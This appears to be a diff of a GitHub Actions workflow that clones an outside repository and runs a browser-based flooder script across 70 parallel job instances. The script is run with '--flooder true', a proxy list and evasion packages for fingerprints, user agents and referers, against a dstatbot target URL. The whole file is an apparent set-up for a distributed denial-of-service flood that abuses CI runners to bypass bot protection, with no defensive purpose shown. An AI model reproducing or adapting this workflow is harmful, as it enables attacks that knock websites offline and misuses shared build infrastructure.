@@ -30,10 +30,7 @@ jobs:
         with:
           python-version: '3.10'
       
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y xvfb
+      
       
       - name: Install Node.js dependencies
         run: npm install puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer hpack
@@ -43,7 +40,7 @@ jobs:
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           
-          xvfb-run -a node m.js https://captcha.dstatbot.win/mz11YaZP 200 3 3 3
+          xvfb-run -a node browser.js https://captcha.dstatbot.win/HdkhD0lu 700 4 100 m.txt --debug true --flooder true
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
